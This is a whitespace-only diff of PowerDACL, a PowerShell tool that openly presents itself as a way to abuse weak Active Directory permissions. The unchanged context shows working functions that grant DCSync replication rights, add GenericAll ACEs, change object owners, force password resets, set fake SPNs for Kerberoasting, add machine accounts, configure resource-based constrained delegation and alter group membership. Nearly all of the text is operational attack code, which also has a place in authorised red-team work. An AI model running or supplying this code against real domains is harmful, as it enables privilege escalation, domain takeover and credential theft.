@@ -1,16 +1,16 @@
 function PowerDACL{
-	
+
 	<#
 
 	.SYNOPSIS
 	PowerDACL | Author: Rob LP (@L3o4j)
  	https://github.com/Leo4j/PowerDACL
-	
+
 	.DESCRIPTION
 	A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)
-	
+
 	#>
-	
+
 	Write-Output " "
 	Write-Output " PowerDACL | Author: Rob LP (@L3o4j)"
 	Write-Output " "
@@ -79,7 +79,7 @@ function DCSync {
         [string]$TargetDomain,
         [switch]$Remove
     )
-	
+
 	if($TargetDomain){
 		$domainDN = $TargetDomain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
@@ -92,18 +92,18 @@ function DCSync {
 		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
 	}
-	
+
 	try {
         $GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
-		
+
 		$ReplicationRightsGUIDs = @(
             '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
             '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',
             '89e95b76-444d-4c62-991a-0facbeda640c'
         )
-		
+
 		$GrabObjectSID = $GrabObject.objectsid
-		
+
 		$byteArray = @()
 		foreach ($item in $GrabObjectSID) {
 			if ($item -is [System.Byte[]]) {
@@ -112,11 +112,11 @@ function DCSync {
 				$byteArray += [byte]$item
 			}
 		}
-		
+
 		$GrabObjectExtractedSID = GetSID-FromBytes -sidBytes $byteArray
-		
+
 		$GrabObjectSID = [System.Security.Principal.SecurityIdentifier]$GrabObjectExtractedSID
-		
+
         $TargetEntry = [ADSI]"LDAP://$($domainDN)"
         $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
         $ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
@@ -162,17 +162,17 @@ function SetOwner {
 	param (
         [string]$Target,
         [string]$TargetDomain,
-		[string]$Owner, 
+		[string]$Owner,
         [string]$OwnerDomain
     )
-	
+
 	try {
         $GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
         $GrabObjectDN = $GrabObject.distinguishedname
 
         $GrabOwner = Get-ADSIObject -Domain $OwnerDomain -samAccountName $Owner
         $OwnerSID = $GrabOwner.objectsid
-		
+
 		$byteArray = @()
 		foreach ($item in $OwnerSID) {
 			if ($item -is [System.Byte[]]) {
@@ -206,10 +206,10 @@ function GenericAll {
 		[string]$Grantee,
         [string]$GranteeDomain
     )
-	
+
 	$GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
 	$GrabObjectDN = $GrabObject.distinguishedname
-	
+
 	$GrabGrantee = Get-ADSIObject -Domain $GranteeDomain -samAccountName $Grantee
 	$GrabGranteeSID = $GrabGrantee.objectsid
 	$byteArray = @()
@@ -221,13 +221,13 @@ function GenericAll {
 		}
 	}
 	$GranteeExtractedSID = GetSID-FromBytes -sidBytes $byteArray
-	
+
 	$TargetEntry = [ADSI]"LDAP://$($GrabObjectDN)"
 	$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
 	$ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
-	
+
 	$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$GranteeExtractedSID)),[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,[System.Security.AccessControl.AccessControlType]::Allow,[System.DirectoryServices.ActiveDirectorySecurityInheritance]::None)
-	
+
 	$ObjectSecurity.AddAccessRule($ACE)
 	$TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
 	try {
@@ -243,7 +243,7 @@ function ForceChangePass {
         [string]$TargetDomain,
 		[string]$Password
     )
-	
+
 	try{
 		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
 		$user = [ADSI]"LDAP://$($GrabObject)"
@@ -260,7 +260,7 @@ function SetSPN {
         [string]$TargetDomain,
 		[string]$SPN = "fake/fake"
     )
-	
+
 	try{
 		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
 		$user = [ADSI]"LDAP://$($GrabObject)"
@@ -276,18 +276,18 @@ function RemoveSPN {
         [string]$Target,
         [string]$TargetDomain
     )
-	
+
 	try{
 		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
 		$user = [ADSI]"LDAP://$($GrabObject)"
 		$existingSPNs = $user.Properties["servicePrincipalName"]
-		
+
 		if ($existingSPNs.Count -gt 0) {
 			$user.Properties["servicePrincipalName"].Clear()
             $user.SetInfo()
 			Write-Output "[+] Successfully removed SPNs from $Target"
 		}
-		
+
 		else {
 			Write-Output "[-] No SPNs found for $Target"
 		}
@@ -301,7 +301,7 @@ function EnableAccount {
         [string]$Target,
         [string]$Domain
     )
-	
+
 	if($Domain){
 		$domainDN = $Domain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
@@ -316,20 +316,20 @@ function EnableAccount {
 	}
 
     try {
-		
+
 		if (-not $Target.EndsWith('$')) {
 			$account = ([ADSI]"LDAP://CN=$Target,CN=Users,$domainDN")
 		}
-		
+
         else{
 			$Target = $Target -replace '\$',''
 			$account = ([ADSI]"LDAP://CN=$Target,CN=Computers,$domainDN")
 		}
 
         $uac = $account.Properties["userAccountControl"][0]
-		
+
 		if($uac -eq '4096'){Write-Output "[*] Account is already enabled"}
-		
+
         else{
 			$newUac = $uac -band -3
 			$account.Put("userAccountControl", $newUac)
@@ -346,7 +346,7 @@ function DisableAccount {
         [string]$Target,
         [string]$Domain
     )
-	
+
 	if($Domain){
 		$domainDN = $Domain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
@@ -364,16 +364,16 @@ function DisableAccount {
 		if (-not $Target.EndsWith('$')) {
 			$account = ([ADSI]"LDAP://CN=$Target,CN=Users,$domainDN")
 		}
-		
+
         else{
 			$Target = $Target -replace '\$',''
 			$account = ([ADSI]"LDAP://CN=$Target,CN=Computers,$domainDN")
 		}
 
         $uac = $account.Properties["userAccountControl"][0]
-        
+
 		if($uac -eq '4098'){Write-Output "[*] Account is already disabled"}
-		
+
 		else{
 			$newUac = $uac -bor 2
 			$account.Put("userAccountControl", $newUac)
@@ -391,7 +391,7 @@ function AddComputer {
         [string]$Password,
         [string]$Domain
     )
-	
+
 	if($Domain){
 		$domainDN = $Domain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
@@ -404,17 +404,17 @@ function AddComputer {
 		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
 	}
-	
+
 	try{
-	
+
 		$computersContainer = [ADSI]"LDAP://CN=Computers,$domainDN"
-		
+
 		$newComputer = $computersContainer.Create("Computer", "CN=$ComputerName")
-		
+
 		$newComputer.Put("sAMAccountName", "$ComputerName`$")
   		$newComputer.Put("userAccountControl", 4096)
 		$newComputer.Put("dNSHostName",  "$ComputerName.$Domain")
-		
+
 		$spns = @(
 			"HOST/$ComputerName.$Domain",
 			"RestrictedKrbHost/$ComputerName.$Domain",
@@ -422,19 +422,19 @@ function AddComputer {
 			"RestrictedKrbHost/$ComputerName"
 		)
 		$newComputer.Put("servicePrincipalName", $spns)
-		
+
 		$newComputer.SetInfo()
-		
+
 		if($Password){
 			([ADSI]"LDAP://CN=$ComputerName,CN=Computers,$domainDN").SetPassword($Password)
-			
+
 			Write-Output "[+] Successfully added computer $ComputerName to the domain with password $Password"
 		}
 		else{
 			Write-Output "[+] Successfully added computer $ComputerName to the domain with empty password"
 		}
 	}
-	
+
 	catch {
 		Write-Output "[-] Error occurred while adding computer $ComputerName to domain: $_"
 	}
@@ -445,7 +445,7 @@ function DeleteComputer {
         [string]$ComputerName,
         [string]$Domain
     )
-	
+
 	if($Domain){
 		$domainDN = $Domain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
@@ -458,19 +458,19 @@ function DeleteComputer {
 		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
 		$domainDN = "DC=$domainDN"
 	}
-	
+
 	try{
-	
+
 		$computersContainer = [ADSI]"LDAP://CN=Computers,$domainDN"
-		
+
 		if (-not $ComputerName.EndsWith('$')) {
 			$ComputerName += '$'
 		}
-		
+
 		$computerObject = (Get-ADSIObject -Domain $Domain -samAccountName $ComputerName).distinguishedname
-		
+
 		$computerObject = ($computerObject -split ",")[0]
-		
+
 		if ($computerObject -ne $null) {
             $computersContainer.Delete("Computer", "$computerObject")
             Write-Output "[+] Successfully deleted computer $ComputerName from the domain"
@@ -478,7 +478,7 @@ function DeleteComputer {
             Write-Output "[*] Computer $ComputerName does not exist in the domain"
         }
 	}
-	
+
 	catch {
 		Write-Output "[-] Error occurred while removing computer $ComputerName from domain: $_"
 	}
@@ -491,11 +491,11 @@ function AddToGroup {
 		[string]$Group,
 		[string]$GroupDomain
     )
-	
+
 	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
-	
+
 	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -samAccountName $Group).distinguishedname
-	
+
 	try{
 		([ADSI]"LDAP://$($GrabGroup)").Add("LDAP://$($GrabObject)")
 		Write-Output "[+] Successfully added $Target to group $Group"
@@ -511,11 +511,11 @@ function RemoveFromGroup {
 		[string]$Group,
 		[string]$GroupDomain
     )
-	
+
 	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
-	
+
 	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -samAccountName $Group).distinguishedname
-	
+
 	try{
 		([ADSI]"LDAP://$($GrabGroup)").Remove("LDAP://$($GrabObject)")
 		Write-Output "[+] Successfully removed $Target from group $Group"
@@ -532,14 +532,14 @@ function RBCD {
 		[string]$GranteeDomain,
 		[switch]$Clear
     )
-	
+
 	if($Clear){
 		Set-DomainObject -Identity $Target -Domain $TargetDomain -Clear @('msDS-AllowedToActOnBehalfOfOtherIdentity')
 		break
 	}
-	
+
 	$extractedRawSID = (Get-ADSIObject -Domain $GranteeDomain -samAccountName $Grantee).objectsid
-	
+
 	$byteArray = @()
 
 	foreach ($item in $extractedRawSID) {
@@ -549,19 +549,19 @@ function RBCD {
 			$byteArray += [byte]$item
 		}
 	}
-	
+
 	$extractedSID = GetSID-FromBytes -sidBytes $byteArray
-	
+
 	$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$extractedSID)"
-	
+
 	$rsdb = New-Object byte[] ($rsd.BinaryLength)
-	
+
 	$rsd.GetBinaryForm($rsdb, 0)
-	
+
 	Set-DomainObject -Identity $Target -Domain $TargetDomain -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb}
 }
 
-function Set-DomainObject {	
+function Set-DomainObject {
     param (
         [string]$Identity,
         [hashtable]$Set = @{},
@@ -677,7 +677,7 @@ function GetSID-FromBytes {
 	param (
         [byte[]]$sidBytes
     )
-	
+
 	$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
 	$stringSid = $sid.Value
 	return $stringSid
